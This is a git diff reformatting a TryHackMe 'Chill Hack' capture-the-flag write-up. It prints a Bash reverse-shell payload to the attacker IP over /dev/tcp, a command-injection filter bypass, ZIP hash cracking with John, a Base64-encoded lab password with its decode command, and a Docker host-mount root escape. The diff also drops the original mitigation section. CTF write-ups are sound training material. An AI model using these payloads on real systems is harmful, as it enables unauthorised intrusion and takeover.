@@ -1,266 +1,252 @@
-Chill Hack — TryHackMe
+# 🔥 Chill Hack — TryHackMe
 
-Platform: TryHackMe
-Machine: Chill Hack
-Difficulty: Easy
-Target IP: 10.128.184.149
-Attacker IP: 192.168.129.228
 
-1. Reconnaissance
+|                 |                   |
+| --------------- | ----------------- |
+| **Platform**    | TryHackMe         |
+| **Room**        | Chill Hack        |
+| **Difficulty**  | Easy              |
+| **Target IP**   | `10.128.184.149`  |
+| **Attacker IP** | `192.168.129.228` |
 
-I started with an Nmap scan to identify the exposed services and their versions.
 
+---
+
+## 1. 🔎 Reconnaissance
+
+I started by performing an Nmap scan to identify open ports, running services, and their versions.
+
+```bash
 nmap -sC -sV 10.128.184.149
+```
 
-Open ports
-Port	Service	Version
-21/tcp	FTP	vsftpd 3.0.5
-22/tcp	SSH	OpenSSH 8.2p1
-80/tcp	HTTP	Apache 2.4.41
+**Open Ports:**
 
-One particularly interesting finding was that anonymous FTP access was enabled.
 
-2. FTP Enumeration
+| Port   | Service | Version       |
+| ------ | ------- | ------------- |
+| 21/tcp | FTP     | vsftpd 3.0.5  |
+| 22/tcp | SSH     | OpenSSH 8.2p1 |
+| 80/tcp | HTTP    | Apache 2.4.41 |
 
-I connected to the FTP service using the anonymous account:
 
+👉 **Key finding:** anonymous FTP access is enabled.
+
+---
+
+## 2. 📁 FTP Enumeration
+
+I connected to the FTP service using the anonymous account.
+
+```bash
 ftp 10.128.184.149
+# Name: anonymous
+# Password: (empty)
+```
 
+Anonymous authentication was successful. I found a file named `note.txt` on the FTP server and downloaded it:
 
-Anonymous authentication was successful.
+```bash
+get note.txt
+```
 
-The FTP server contained a file named note.txt, which I downloaded and inspected:
+**Contents of `note.txt`:**
 
-Anurodh told me that there is some filtering on strings being put in the command -- Apaar
+> Anurodh told me that there is some filtering on strings being put in the command -- Apaar
 
+💡 **Important clue:** a string-filtering mechanism exists within the web application.
 
-This provided an important clue about command filtering on the web application.
+---
 
-3. Web Enumeration
+## 3. 🌐 Web Enumeration
 
 I then investigated the HTTP service running on port 80.
 
-The web application exposed an endpoint that accepted user input and allowed commands to be executed.
+The web application exposed an **endpoint accepting user input** that allowed commands to be executed.
 
-Further testing revealed that the application was vulnerable to command injection.
+The application was vulnerable to **command injection**, but it filtered certain strings used in commands.
 
-The application filtered certain strings, but the filtering could be bypassed by using an absolute path.
+**Bypass:** the filtering could be bypassed by using the **absolute path** to the required binary:
 
-For example, instead of relying on a command being resolved through the $PATH, I could explicitly reference the binary:
-
+```bash
 /bin/bash
+```
 
+This technique made it possible to bypass the filtering mechanism and execute a reverse shell.
 
-This allowed me to bypass the filtering mechanism and execute a reverse shell payload.
+---
 
-4. Obtaining a Reverse Shell
+## 4. 💻 Command Injection
 
-I configured a listener on my attacking machine:
+I configured a Netcat listener on my attacking machine:
 
+```bash
 nc -lvnp <PORT>
+```
 
+I then supplied a Bash reverse-shell payload through the vulnerable parameter:
 
-I then supplied a Bash reverse-shell payload through the vulnerable parameter.
+```bash
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.228/<PORT> 0>&1'
+```
 
-After triggering the request, I received a connection back to my machine.
+After executing the payload, I received a connection back to my machine: **initial shell obtained** on the target. 🎉
 
-At this point, I had obtained an initial shell on the target.
+At this point, I started enumerating the system to identify potential privilege-escalation paths.
 
-5. Privilege Escalation to Apaar
+---
 
-After obtaining the initial shell, I started enumerating the system and looking for ways to escalate privileges.
+## 5. ⬆️ Privilege Escalation to Apaar
 
-One interesting file was:
+During local enumeration, I discovered an interesting script: `.helpfine.sh`.
 
-.helpfine.sh
+I checked the current user's sudo privileges:
 
-
-I discovered that this script could be executed through sudo as the user apaar.
-
-I verified the available sudo privileges with:
-
+```bash
 sudo -l
+```
 
+The script could be executed with elevated privileges as the user **apaar**. I ran it in that context and obtained a shell with apaar's privileges.
 
-The script could then be executed in the context of apaar.
+### 🚩 User Flag
 
-By exploiting this, I obtained a shell with the privileges of the apaar user.
-
-User Flag
+```text
 e8vpd3****************************
+```
 
-6. Investigating the Apaar Account
+---
 
-Once I had access as apaar, I inspected the user's home directory and hidden files.
+## 6. 🔍 Local Enumeration
 
-The .ssh directory was present:
+After obtaining access as apaar, I continued enumerating the user's home directory and hidden files:
 
+```bash
 ls -la /home/apaar/
+```
 
+A `.ssh` directory was present — SSH-related files could potentially be useful for further access.
 
-This indicated that SSH credentials could potentially be useful for further access.
+I also continued investigating the files belonging to the web application.
 
-I continued enumerating the web application's files.
+---
 
-7. Discovering Credentials in the Web Application
+## 7. 🔐 Credential Discovery
 
-While examining the web application's source files, I found an interesting PHP file:
+While examining the web application's files, I found:
 
+```text
 /var/www/files/index.php
+```
 
+The PHP source code contained credentials stored in **clear text**.
 
-The source code contained credentials stored in clear text.
+💡 Credentials stored in application source code can potentially be **reused to access other services**.
 
-This was an important finding because credentials exposed in application source code can often be reused elsewhere.
+I also discovered an image directory containing files that appeared relevant to the challenge.
 
-I also discovered an image directory containing files that appeared to be relevant to the challenge.
+---
 
-8. Steganography
+## 8. 🖼️ Steganography
 
-One of the images contained hidden data.
+One of the images contained hidden data: a **ZIP archive** was embedded within it.
 
-After investigating the image, I identified an embedded ZIP archive.
+The archive was **password protected**. I extracted its hash and cracked it with John the Ripper:
 
-The archive was password protected, so I extracted its hash and used John the Ripper to recover the password:
+```bash
+# Extract the hash
+zip2john archive.zip > hash.txt
 
+# Crack the password
 john hash.txt --wordlist=<wordlist>
+```
 
+The recovered password allowed me to extract the archive:
 
-The recovered password allowed me to extract the archive.
+```bash
+unzip archive.zip
+```
 
-Inside the archive was a PHP file containing an encoded credential.
+Inside, I found a PHP file containing an encoded credential, encoded in **Base64**:
 
-The credential was encoded using Base64:
-
+```text
 IWQwbnRLbjB3bVlwQHNzdzByZA==
-
+```
 
 I decoded it with:
 
+```bash
 echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
+```
 
+This revealed a password associated with the **anurodh** account.
 
-This revealed a password associated with the anurodh account.
+> ⚠️ **Note:** sensitive credentials are intentionally not displayed in clear text in this write-up.
 
-9. SSH Access as Anurodh
+---
+
+## 9. 🔑 SSH Access
 
 I tested the recovered credentials against the SSH service:
 
+```bash
 ssh anurodh@10.128.184.149
+```
 
+The credentials were valid, giving me an **interactive SSH session as anurodh**, allowing further local enumeration from this account.
 
-The credentials were valid, giving me an interactive SSH session as anurodh.
+---
 
-I could now perform further local enumeration from a more privileged account.
+## 10. 🐳 Docker Privilege Escalation
 
-10. Docker Privilege Escalation
+While enumerating the anurodh account, I discovered that the user had access to **Docker**.
 
-During the enumeration of the system, I discovered that the current user had access to Docker.
+💡 Docker access can be highly privileged: containers can potentially be started with access to the **host filesystem**.
 
-Docker access can be highly privileged because containers can potentially be started with access to the host filesystem.
+I used the following Docker-based privilege-escalation technique:
 
-I used the corresponding Docker privilege-escalation technique to mount the host filesystem inside a container:
-
+```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+```
 
+**How it works:**
 
-The host filesystem was mounted under /mnt, and chroot allowed me to switch the root directory to the mounted host filesystem.
+- `-v /:/mnt` → mounts the host filesystem inside the container under `/mnt`;
+- `chroot /mnt /bin/sh` → changes the root directory to the mounted host filesystem.
 
-This resulted in a root shell on the target system.
+I obtained a root shell and verified my privileges:
 
-I verified my privileges with:
-
+```bash
 whoami
+```
 
+**Output:**
 
-Output:
-
+```text
 root
+```
 
-11. Root Flag
+✅ Escalation to **root** confirmed.
 
-The final flag was located after obtaining root access.
+---
 
+## 11. 🚩 Root Flag
+
+With root access, I was able to retrieve the final flag:
+
+```text
 w18gfp****************************
+```
 
-12. Attack Path Summary
+---
 
-The complete attack chain was:
+## 📝 Attack Path Summary
 
-Anonymous FTP
-      ↓
-Information disclosure
-      ↓
-Web enumeration
-      ↓
-Command injection
-      ↓
-Reverse shell
-      ↓
-Sudo misconfiguration
-      ↓
-User: apaar
-      ↓
-Web application credential discovery
-      ↓
-Steganography
-      ↓
-ZIP password cracking
-      ↓
-Credential recovery
-      ↓
-SSH access as anurodh
-      ↓
-Docker privilege escalation
-      ↓
-Root
-
-13. Key Takeaways
-
-This room demonstrated several important penetration-testing concepts:
-
-Service enumeration with Nmap
-
-Anonymous FTP enumeration
-
-Command injection
-
-Reverse shells
-
-Sudo privilege escalation
-
-Local file and source-code enumeration
-
-Steganography
-
-Password cracking with John the Ripper
-
-Base64 decoding
-
-SSH credential reuse
-
-Docker-based privilege escalation
-
-The main lesson from this machine is the importance of chaining multiple small weaknesses together. None of the individual findings necessarily provided complete control, but combining them allowed the attack to progress from anonymous FTP access to a root shell.
-
-14. Mitigation
-
-From a defensive perspective, the following measures could reduce the attack surface:
-
-Disable anonymous FTP access unless it is strictly required.
-
-Properly validate and sanitize user-controlled input.
-
-Avoid command execution from web applications whenever possible.
-
-Implement strict sudo permissions and avoid allowing users to execute arbitrary scripts with elevated privileges.
-
-Never store credentials in source code.
-
-Avoid embedding sensitive information in publicly accessible files.
-
-Protect archives and sensitive data with strong passwords.
-
-Restrict Docker access to trusted administrators.
-
-Apply the principle of least privilege to system and service accounts.
+1. **Recon** → Nmap: FTP (anonymous), SSH, HTTP
+2. **FTP** → `note.txt`: clue about command filtering
+3. **Web** → Command injection, bypassed via absolute path `/bin/bash`
+4. **Initial shell** → Netcat reverse shell
+5. **Escalation** → `.helpfine.sh` script via `sudo -l` → user **apaar** → 🚩 User flag
+6. **Credentials** → Clear-text passwords in `index.php`
+7. **Stego** → ZIP hidden in an image, cracked with John → **anurodh** password (Base64)
+8. **SSH** → Logged in as anurodh
+9. **Root** → Docker escape (`docker run -v /:/mnt`) → 🚩 Root flag
